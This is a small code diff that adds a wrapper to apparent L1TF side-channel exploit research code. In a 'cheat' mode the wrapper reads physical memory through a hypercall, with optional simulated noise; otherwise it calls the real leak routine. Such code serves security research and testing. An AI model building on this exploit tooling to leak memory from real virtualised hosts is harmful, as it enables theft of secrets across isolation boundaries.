@@ -1163,6 +1163,24 @@ int confidently_cached(hpa_t pa, u64 len)
   return non_zero_data;
 }
 
+void l1tf_leak_cheat_wrapper(char *data, uintptr_t base, uintptr_t pa, uintptr_t len)
+{
+#if LEAK == CHEAT || LEAK == CHEAT_NOISY
+    u64 *buf = malloc(len + 8);
+    for (int off = 0; off < len; off += 8)
+            buf[off/8] = hc_read_pa(pa+off);
+    memcpy(data, buf, len);
+  #if LEAK == CHEAT_NOISY
+    for (int i = 0; i < len; i++)
+      if (rdrand() % 1024 < 100)
+        ((char *)data)[i] = 0;
+  #endif
+#else // LEAK == L1tF || SKIP
+  _l1tf_leak(data, base, pa, len);
+#endif
+}
+
+
 void l1tf_leak(char *data, uintptr_t base, uintptr_t pa, uintptr_t len)
 {
   const int verbose = 0;
